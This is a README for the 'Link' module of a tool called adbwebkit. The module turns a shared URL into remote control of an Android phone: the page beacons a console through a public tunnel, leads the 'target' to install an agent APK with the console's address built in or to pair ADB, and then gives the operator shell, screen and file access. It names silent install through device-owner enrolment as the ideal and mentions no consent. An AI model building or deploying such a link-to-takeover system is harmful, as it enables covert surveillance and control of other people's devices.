# Link — gain a device from a URL

The Link tab turns one click into control. Someone opens a link; the console
reaches them, installs an agent, and from then on the existing adbwebkit tabs
(`Shell`, `Screen`, `Files`, `Application`, …) drive that device.

There is no framework here. adbwebkit stays PHP + ADB; the link adds three
things: a page the visitor loads, a callback that proves a channel exists, and a
build pipeline that bakes the console's address into an APK.

## Why it works with no port, no LAN, no router rule

A phone on mobile data sits behind carrier NAT, so the console can never call
in. Every link is therefore outbound-only: the visitor's browser (and later the
agent) call the console. The console learns the visitor's address from the
connection itself — `REMOTE_ADDR` / `X-Forwarded-For` — never from a value the
visitor could forge.

The one address that must be known up front is the console's own. That is baked
into the agent at arm time (`Config.BASE`), because the agent has no other way to
find the console. If the tunnel changes, the public URL changes, so **arm a fresh
link**; an installed agent keeps polling its old baked address.

## Run it

```bash
cd ~/adbwebkit
TUNNEL=1 ./serve.sh          # opens a public cloudflared URL, sets ADBWEBKIT_URL
```

Open `http://127.0.0.1:8080/`, tab **Link**, name it, **Generate link**. Copy the
URL or scan the QR. When the target opens it:

1. it beacons the console — the console records the hit and the device id;
2. **Detect & connect** installs the agent APK (one Android prompt);
3. **Bind adbwebkit to this device** points every tab at that device.

`TUNNEL=0` (default) keeps it local for testing; set `ADBWEBKIT_URL` yourself if
you front it with nginx/tailscale instead of cloudflared.

## The three ways in

Tried in order, each a superset of the last, so a visitor with no ADB knowledge
still works and can upgrade to full ADB with one tap:

1. **Beacon** — the page calls `/s/<sid>/enroll`. If that lands, a reverse
   channel exists and the agent/ADB path is open. Zero effort for the visitor.
2. **Tap-to-pair** — turn on Wireless debugging, type the two numbers. The
   console runs `adb pair` from the caller's own source address, then
   `adb connect`. Full ADB from then on.
3. **USB ADB** — install the agent on a device adbwebkit is *already* connected
   to (the classic path). No tap at all.

## Files

```
router.php            routes /s/<sid>/<verb> to the gate; / to the UI
serve.sh              starts the console (+ optional cloudflared tunnel)
link/config.php       paths, env, atomic JSON, touch log
link/gate.php         view, enroll, state, apk, pair, attach, agent protocol
link/adbctrl.php      adb wrapper + connect lock + vendor keys
link/arm.php          create a link and build the baked agent
link/ssrf_guard.php   range-based SSRF check with DoH and an allow-list
link/linkpage.html    the page the visitor loads
pages/link.php        the operator tab
process/link.php      operator endpoint (arm/attach/install/status/probe)
```

State lives in `linkdata/` (git-ignored): one dir per sid, plus built APKs.

## The agent

Built from `~/cgagent` (override with `ADBWEBKIT_AGENT_SRC`). `arm.php` runs
`build.sh` with `BASE` and `SID` in the environment, then serves the result at
`/s/<sid>/apk`. It is the same agent controlgui uses, so it already speaks the
report/poll contract; adbwebkit now serves that contract too
(`/s/<sid>/agent/apk.json`, `/s/<sid>/agent/report`).

As a plain app Android shows its installer (one tap). As device owner — enroll
via QR at provisioning — the install is silent, which is the floor of the whole
idea.

## Env

| var | default | meaning |
|---|---|---|
| `ADBWEBKIT_URL` | request Host | console public address, baked into the agent |
| `ADBWEBKIT_PORT` | 8080 | local listen port |
| `ADBWEBKIT_ADB` | `adb` | adb binary |
| `ADBWEBKIT_AGENT_SRC` | `~/cgagent` | agent source tree |
| `ADBWEBKIT_ALLOW_PRIVATE` | off | allow the guard to fetch private/link ranges |
| `ADBWEBKIT_NTFY` | cg topic | pointer topic, if reusing controlgui's |

## Limits, named

- **New URL per tunnel** — a settled tunnel (`ADBWEBKIT_URL` fixed) removes this.
- **`pair` needs Wireless debugging on** — the visitor's one setup step; USB
  path avoids it but needs a cable.
- **Root is the caller's problem** — link/agent work unrooted; root-mode tabs
  still need `su` on the device.
- **Guard is range-based** — `100.64/10` (carrier NAT) and friends are treated
  as private; flip `ADBWEBKIT_ALLOW_PRIVATE` to fetch the phone's own services.
